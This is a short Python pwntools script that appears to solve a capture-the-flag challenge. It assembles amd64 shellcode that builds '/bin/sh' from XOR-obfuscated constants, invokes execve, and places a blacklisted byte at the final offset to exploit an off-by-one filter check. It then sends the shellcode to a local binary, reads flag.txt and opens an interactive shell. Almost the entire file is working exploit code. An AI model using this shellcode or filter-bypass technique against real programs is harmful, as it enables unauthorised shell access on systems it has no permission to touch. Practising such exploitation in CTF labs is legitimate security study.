from pwn import asm, context, process

import shutil, os



context.arch = 'amd64'



# Shellcode that builds '/bin/sh', invokes execve and uses a banned byte (0x3b)

# placed at the final offset to bypass the off-by-one blacklist check.

code = '''

    mov rax, 0x87ac32aa79ad3c42
    
        push rax
        
            xor dword ptr [rsp], 0x17c45e6d
            
                xor dword ptr [rsp+4], 0x87c44185
                
                    mov rdi, rsp
                    
                        xor ebx, ebx
                        
                            mov esi, ebx
                            
                                mov edx, ebx
                                
                                    mov eax, ebx
                                    
                                        mov al, byte ptr [rip+0x10]
                                        
                                            syscall
                                            
''' + 'nop\n' * 14 + '.byte 0x3b\n'



sc = asm(code)

assert len(sc) == 60 and sc[-1] == 0x3b



# copy binary to a writable location and mark executable

binary = './execute'

local_bin = '/tmp/execute'

shutil.copy(binary, local_bin)

os.chmod(local_bin, 0o755)



p = process(local_bin)

print(p.recvline().decode())



p.send(sc)



# interact with spawned shell

p.sendline(b'cat flag.txt')
print(p.recvline().decode())
p.interactive()
